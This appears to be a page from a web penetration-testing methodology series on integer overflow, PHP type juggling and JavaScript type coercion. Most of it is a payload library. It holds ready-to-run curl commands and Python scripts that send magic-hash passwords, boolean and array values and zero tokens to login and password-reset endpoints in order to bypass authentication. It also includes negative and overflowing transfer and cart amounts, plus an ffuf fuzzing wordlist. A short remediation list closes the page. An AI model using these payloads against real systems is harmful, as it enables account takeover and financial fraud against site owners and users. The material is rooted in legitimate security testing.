---
title: "Integer Overflow, Type Juggling & Type Confusion"
date: 2026-02-24
draft: false
---

# Integer Overflow, Type Juggling & Type Confusion

> **Severity**: Medium–Critical | **CWE**: CWE-190, CWE-843, CWE-704
> **OWASP**: A03:2021 – Injection | A04:2021 – Insecure Design

---

## What Are These Vulnerabilities?

Three related but distinct classes of numeric/type confusion vulnerabilities in web applications:

**Integer Overflow**: arithmetic wraps around when exceeding the integer type's maximum value. Common in C extensions, Go, Rust FFI, and server-side quantity/price calculations.

**PHP Type Juggling**: PHP's loose comparison (`==`) coerces types before comparing — `"0e12345" == "0e67890"` is `true` (both are scientific notation for 0), `0 == "anything_non_numeric"` is `true` in PHP < 8, `"1" == true` is `true`.

**JavaScript Type Coercion**: `==` operator in JS performs implicit type conversion — `0 == false`, `"" == false`, `null == undefined`, `[] == 0`, `"1" == true`.

All three enable authentication bypass, authorization bypass, and business logic subversion.

```
PHP loose comparison attack:
  MD5("240610708") === "0e462097431906509019562988736854"
  MD5("QNKCDZO")   === "0e830400451993494058024219903391"
  "0e..." == "0e..."  → true (both treated as float 0)
  → two different passwords produce the same hash under ==
```

---

## Discovery Checklist

**Phase 1 — Find Numeric Processing**
- [ ] Quantity fields in shopping cart, transfer amounts, reward point redemption
- [ ] Version numbers, pagination offsets, limit parameters
- [ ] API keys, token IDs — any field that gets cast to integer
- [ ] Hash comparison endpoints (login, password reset token validation, HMAC verification)
- [ ] Any boolean-returning comparison in authentication logic

**Phase 2 — Test Type Juggling (PHP)**
- [ ] Login with password = `true`, `1`, `0`, `[]` (array) — observe response
- [ ] Login with MD5 magic hashes (passwords whose MD5 starts with `0e`)
- [ ] Submit `{"password": true}` in JSON — some APIs accept JSON body
- [ ] Test reset token: `token=0` or `token=true` or `token=null`
- [ ] Test comparison endpoints: HMAC validation, API key check, license validation

**Phase 3 — Test Integer Overflow**
- [ ] Send extremely large numbers: `9999999999999999999`, `2147483648`, `4294967296`
- [ ] Send negative numbers: `-1`, `-99999`, `−2147483648`
- [ ] Send float where integer expected: `1.9999`, `0.0001`
- [ ] Overflow addition: quantity × price calculation — does total wrap to negative?
- [ ] Test 32-bit boundary: `2^31 - 1 = 2147483647`, `2^31 = 2147483648` (wraps to negative)
- [ ] Test 64-bit boundary: `2^63 = 9223372036854775808`

---

## Payload Library

### Payload 1 — PHP Magic Hashes (Type Juggling via `==`)

```
# PHP loose comparison: "0e[digits]" == "0e[other_digits]" → TRUE
# Both strings are interpreted as floating-point 0 in scientific notation

# Magic hash pairs — these MD5 digests start with 0e followed only by digits:
# Password        → MD5 hash
# 240610708       → 0e462097431906509019562988736854
# QNKCDZO         → 0e830400451993494058024219903391
# aabC9RqS        → 0e041022518165728065344349536299
# 0e1137126905    → 0e291659922323405260514745084877
# aabg7XSs        → 0e087386482136013740957780965295
# aahX8Vu2        → 0e098064545233671498763604909935
# aaroZmOk        → 0e520857067154428119440350944016
# aaK1STfY        → 0e76658526655756207688271159624026

# If target stores passwords as MD5 and uses == for comparison:
# Logging in as any user whose stored hash starts with 0e[digits]:
# → provide any of the above passwords → 0e... == 0e... → TRUE → login success

# SHA1 magic hashes (for SHA1-based comparisons):
# 10932435112     → 0e07766915004133176347055865026311692244
# 0e807097        → 0e828208813914405941274003476139492099779

# SHA256 magic hashes (rarer but exist):
# 34250003024812  → 0e46289032038065916139621039085883773413

# Attack: try these as password on login form
# If using JSON API:
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"240610708"}'

# Also try the boolean/array juggling:
# PHP: 0 == "any_string_not_starting_with_digit" → TRUE (PHP < 8)
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":0}'

# Array bypass (strcmp($input, $hash) returns 0/null for array input in old PHP):
# strcmp([], "anything") → Warning + returns NULL → NULL == 0 → true
curl -X POST https://target.com/login \
  -d "username=admin&password[]=1"
```

### Payload 2 — PHP Loose Comparison Bypass Matrix

```php
# Truth table for PHP loose comparison (==) — use to craft bypass:

# String vs Boolean:
# "admin" == true   → TRUE
# ""      == false  → TRUE
# "0"     == false  → TRUE
# "1"     == true   → TRUE

# String vs Integer:
# "1abc" == 1       → TRUE (PHP < 8)
# "0"    == false   → TRUE
# "0"    == 0       → TRUE
# ""     == 0       → TRUE (PHP < 8)
# "0e5"  == 0       → TRUE (scientific notation = 0)

# Null comparisons:
# null == false     → TRUE
# null == 0         → TRUE
# null == ""        → TRUE
# null == "0"       → FALSE (exact: null != "0")

# Applications in attacks:

# 1. Token validation bypass:
# if ($token == $_GET['token']) → use token=0 or token=true
curl "https://target.com/reset?token=0&email=admin@target.com"
curl "https://target.com/reset?token=true&email=admin@target.com"

# 2. Version comparison bypass:
# if ($version == "2.0") → send "2" or "2.0abc" (PHP < 8)
curl "https://target.com/api?version=2"

# 3. API key comparison:
# if ($key == $stored_key) → if stored_key is "0e..." send any other "0e..." string
curl "https://target.com/api?key=0e0" -H "X-API-Key: 0e0"

# 4. JSON type injection (PHP decodes JSON → PHP types):
# json_decode('{"admin":true}') → stdObject with admin=TRUE
# if ($input->admin == true) → always true
curl -X POST https://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"username":"test","isAdmin":true,"role":1}'

# 5. switch() type juggling:
# switch ("0e1234") { case 0: ... } → matches case 0!
# Send: "0e0" to any switch-based comparison
```

### Payload 3 — JavaScript Type Coercion Bypass

```javascript
// JS == operator coercion rules:
// null == undefined     → true
// 0 == false            → true
// "" == false           → true
// "" == 0               → true
// "1" == true           → true
// [] == false           → true
// [] == 0               → true
// [] == ""              → true
// [[]] == 0             → true
// [1] == 1              → true
// [1,2] == "1,2"        → true
// NaN == NaN            → FALSE (NaN is never equal)

// Attack scenarios:

// 1. Node.js authentication with loose comparison:
// if (req.body.password == storedPassword)
// → send: password=true, password=0, password=[]

// 2. Express.js query parameter type confusion:
// GET /admin?admin=true → req.query.admin === "true" (string) → fine
// GET /admin?admin[]=1  → req.query.admin = ["1"] (array) → truthy → bypass if == check

// 3. NoSQL MongoDB operator injection via type confusion:
// username[$ne]=x → MongoDB operator, not string → bypass

// 4. Number parsing edge cases:
// parseInt("9e9") === 9         (stops at 'e', base 10)
// parseFloat("9e9") === 9000000000
// +"" === 0
// +"   " === 0
// +null === 0
// +undefined === NaN
// +[] === 0
// +[1] === 1
// +[1,2] === NaN

// If server validates: if (parseInt(id) > 0) — bypass with:
// id="9abc" → parseInt = 9 (passes), but actual lookup uses "9abc"
// id="0.1"  → parseInt = 0 (fails), parseFloat = 0.1 (may pass)

// 5. JSON null bypass:
// POST {"userId": null} → if (!userId) check may pass with null being falsy
// POST {"role": null}   → typeof null === "object" (JS quirk)
```

### Payload 4 — Integer Overflow in Business Logic

```http
# Shopping cart — overflow total price:
# If server uses 32-bit int for price (cents): max = 2147483647 ($21,474,836.47)
# Overflow: 2147483647 + 1 = -2147483648 (negative!)

POST /api/cart/update HTTP/1.1
Content-Type: application/json

{"productId": "PROD1", "quantity": 2147483647}
# If price_total = price * quantity overflows → negative total → free items

# Or directly:
{"productId": "PROD1", "quantity": -1}
# Negative quantity → negative price → store owes you money

{"productId": "PROD1", "quantity": 0}
# Zero quantity bypasses minimum order validation

# Large offset in pagination (LIMIT/OFFSET SQL):
GET /api/items?page=1&limit=9999999999 HTTP/1.1
# May cause OFFSET integer overflow in SQL → unexpected results

# Negative page offset:
GET /api/items?page=-1&offset=-100 HTTP/1.1
# May return results from before expected range

# Transfer amount overflow:
POST /api/transfer HTTP/1.1
Content-Type: application/json

{"from": "USER_ACCT", "to": "ATTACKER_ACCT", "amount": -1000}
# Negative transfer → adds to source account, subtracts from destination

{"from": "USER_ACCT", "to": "ATTACKER_ACCT", "amount": 9223372036854775808}
# 2^63: int64 overflow → wraps to -9223372036854775808 → negative balance credited

# Promo code: apply 100% discount → integer underflow in remaining amount:
POST /api/promo HTTP/1.1
Content-Type: application/json

{"code": "DISCOUNT100", "amount": 999999}
# If discount = min(amount, promo_max) and promo_max uses unsigned subtraction...
```

### Payload 5 — Float Precision Attacks

```python
#!/usr/bin/env python3
"""
Floating point edge cases for price/amount manipulation
"""
import requests

TARGET = "https://target.com/api/order"
HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}

# Float precision abuse:
float_payloads = [
    # Very small positive number:
    {"amount": 0.000000001, "desc": "tiny positive"},
    # Just below validation threshold:
    {"amount": 0.009, "desc": "below min threshold"},
    # NaN via JSON (not standard but some parsers accept):
    # {"amount": float('nan')} — can't serialize NaN in JSON directly
    # But try string:
    {"amount": "NaN", "desc": "NaN string"},
    {"amount": "Infinity", "desc": "Infinity string"},
    {"amount": float('inf'), "desc": "float infinity"},  # serializes to: Infinity (invalid JSON)
    # Negative zero:
    {"amount": -0.0, "desc": "negative zero"},
    # Overflow double:
    {"amount": 1.7976931348623157e+308, "desc": "max double"},
    {"amount": 1.7976931348623157e+309, "desc": "double overflow → Infinity"},
]

for payload in float_payloads:
    try:
        import json
        body = json.dumps({"productId": "ITEM1", "quantity": 1,
                           "price": payload["amount"]})
        r = requests.post(TARGET, headers=HEADERS, data=body, timeout=5)
        print(f"[{payload['desc']}] Status: {r.status_code} → {r.text[:100]}")
    except Exception as e:
        print(f"[{payload['desc']}] Error: {e}")

# PHP-specific: send very large integer as string to trigger intval() overflow:
large_ints = [
    "2147483648",          # 2^31 — int32 overflow
    "4294967296",          # 2^32
    "9223372036854775808", # 2^63 — int64 overflow on 64-bit
    "99999999999999999999999999999",  # bignum
    "2147483647.9",        # float just below int32 max
]

for val in large_ints:
    r = requests.post(TARGET, headers=HEADERS,
                      json={"productId": "ITEM1", "quantity": val})
    print(f"[int:{val[:20]}] Status: {r.status_code} → {r.text[:80]}")
```

### Payload 6 — Type Confusion in API Key / Token Validation

```bash
# Test API token comparison weakness:

# If server compares token with == instead of ===:
# Token "0e1234..." → magic hash bypass
curl "https://target.com/api/data" \
  -H "X-API-Key: 0e0" \
  -H "Content-Type: application/json"

# Boolean true in JSON (some frameworks auto-cast):
curl "https://target.com/api/data" \
  -H "Content-Type: application/json" \
  -d '{"apiKey": true, "token": true}'

# Integer 0 (equals any empty/zero string in PHP):
curl "https://target.com/api/data?token=0"
curl "https://target.com/api/data?token=0&token=true"

# Array bypass for strcmp():
# strcmp(array, "token") → NULL (warning) → NULL == 0 → auth bypass
curl "https://target.com/api/verify?token[]=1"

# Numeric string comparison (Python Decimal/float edge cases):
# "1e2" == "100" in some comparison contexts
curl "https://target.com/api/data?version=1e0"  # = version 1.0

# Test for hash comparison timing attack + type confusion:
# If: hash_hmac('sha256', $input, $secret) == $provided_hmac
# And secret starts with 0e: try providing 0e followed by digits
for hash_val in "0e0" "0e1" "0e12345" "0e999999999999"; do
  resp=$(curl -s "https://target.com/api/webhook?hmac=$hash_val&data=test")
  echo "hmac=$hash_val → $resp"
done

# PHP JSON type injection — json_decode converts JSON types to PHP types:
# true → (bool)true, 1 → (int)1, "1" → (string)"1"
# if ($data->admin == true) → send: {"admin": true}
curl -X POST https://target.com/api/action \
  -H "Content-Type: application/json" \
  -d '{"action":"sensitive","admin":true,"superuser":1,"bypass":"1"}'
```

---

## Tools

```bash
# Find PHP loose comparison vulnerabilities:
# HashClash / magic hash database:
# https://github.com/spaze/hashes

# PHP 8 changed behavior — identify PHP version first:
curl -I https://target.com/ | grep -i "x-powered-by\|php"
# PHP 7.x and below → loose comparison more exploitable
# PHP 8.0+ → "0" == 0 is now FALSE (strict numeric comparison)

# Type juggling test script:
python3 << 'EOF'
import requests

target = "https://target.com/login"
payloads = [
    {"username": "admin", "password": "240610708"},       # MD5 magic hash
    {"username": "admin", "password": "QNKCDZO"},         # MD5 magic hash
    {"username": "admin", "password": True},               # boolean true
    {"username": "admin", "password": 0},                  # integer 0
    {"username": "admin", "password": ""},                 # empty string
    {"username": "admin", "password": None},               # null
    {"username": "admin", "password": []},                 # empty array
    {"username": "admin", "password": "aabC9RqS"},        # another magic hash
]

for payload in payloads:
    r = requests.post(target, json=payload)
    if "welcome" in r.text.lower() or "dashboard" in r.text.lower() or r.status_code == 302:
        print(f"[!!!] AUTH BYPASS: {payload}")
    else:
        print(f"[ ] Failed: {payload['password']} → {r.status_code}")
EOF

# ffuf — fuzz numeric parameters for overflow:
ffuf -u "https://target.com/api/cart?quantity=FUZZ" \
  -H "Authorization: Bearer TOKEN" \
  -w - << 'WORDLIST'
-1
0
2147483647
2147483648
4294967295
4294967296
9223372036854775807
9223372036854775808
-2147483648
-9223372036854775808
0.1
0.001
-0.1
Infinity
NaN
WORDLIST

# Detect integer overflow in responses — look for negative values:
curl -s "https://target.com/api/cart" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"quantity":9223372036854775808}' | python3 -m json.tool | grep -E '"-[0-9]'
```

---

## Remediation Reference

- **Use strict comparison (`===`) in PHP**: never use `==` for security comparisons — hash comparison, token validation, authentication checks must use `===` or `hash_equals()`
- **`hash_equals()`**: use this PHP function for constant-time comparison of MACs/tokens — it also performs type-safe comparison
- **Validate types explicitly**: before comparing, assert `is_string($token)` and verify length — reject non-string inputs
- **JavaScript**: use `===` (strict equality) everywhere security decisions are made; never use `==`
- **Integer validation**: define min/max bounds for all numeric inputs — reject negative quantities, enforce business logic limits before arithmetic
- **Use `bcmath` or `GMP`**: for financial calculations in PHP, avoid native integer arithmetic — use arbitrary precision libraries
- **Server-side price recalculation**: never trust client-provided price/discount values — always recalculate server-side from product ID
- **Type-safe deserialization**: when deserializing JSON, use typed schemas that reject unexpected types (e.g., `boolean` where `string` expected)

*Part of the Web Application Penetration Testing Methodology series.*
